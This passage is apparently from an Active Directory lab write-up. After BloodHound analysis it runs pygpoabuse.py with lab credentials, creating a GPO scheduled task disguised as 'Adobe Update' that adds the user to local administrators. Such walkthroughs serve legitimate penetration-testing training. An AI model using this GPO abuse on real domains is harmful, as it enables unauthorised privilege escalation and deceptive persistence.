...
[*] Stopping service RemoteRegistry
```
Lets now check that bloodhound data:

<img width="705" height="566" alt="image" src="https://github.com/user-attachments/assets/6466de51-1cb0-4e0a-85f3-d104a2e95036" />

```
python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:Heartsbane -gpo-id 4FD8F4D4-A4CD-41DD-8F1C-643D0A4FF62A \
-powershell \
-command 'net localgroup administrators /add samwell.tarly' \
-description 'Adobe Update' \
-user
```

<img width="1263" height="181" alt="image" src="https://github.com/user-attachments/assets/38344288-e217-40ab-8855-fe307316c615" />

Now wait a few minutes for the scheduled task to run
